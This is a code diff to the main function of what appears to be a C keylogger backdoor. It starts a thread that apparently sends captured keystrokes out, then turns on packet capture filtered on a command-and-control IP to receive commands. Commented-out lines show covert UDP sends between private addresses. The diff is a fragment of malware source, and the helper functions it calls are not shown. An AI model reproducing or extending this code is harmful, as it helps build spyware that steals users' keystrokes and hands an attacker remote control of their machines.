@@ -74,16 +74,12 @@ int main(int argc, char **argv){
     pthread_t keylogger_thread; //create a thread
     pthread_create(&keylogger_thread, NULL, keylogger_send, keylogger_args);
 
-
-    //TESTING
-    //pthread_join(keylogger_thread, NULL);
-/*
+    //commands (put on another thread?)
     printf("%s\n",cnc_ip);
     Filter = InitFilter(cnc_ip,local_ip, true);
     PrintFilter(Filter);
     CreateFilter(Filter, pcapfilter);
     printf("Filter: %s\n",pcapfilter);
-*/
 
 
     /*
@@ -91,8 +87,9 @@ int main(int argc, char **argv){
     buf="ben";
     covert_udp_send("192.168.0.118", "192.168.0.115", 8506, 8506, buf, 2);
     covert_udp_send("192.168.0.118", "192.168.0.115", 8507, 8507, buf, 2);*/
- //   Packetcapture(pcapfilter,Filter,true);
+    Packetcapture(pcapfilter,Filter,true);
 
+    //wait for the keylogger thread to finish before exiting
     pthread_join(keylogger_thread, NULL);
     return 0;
 }
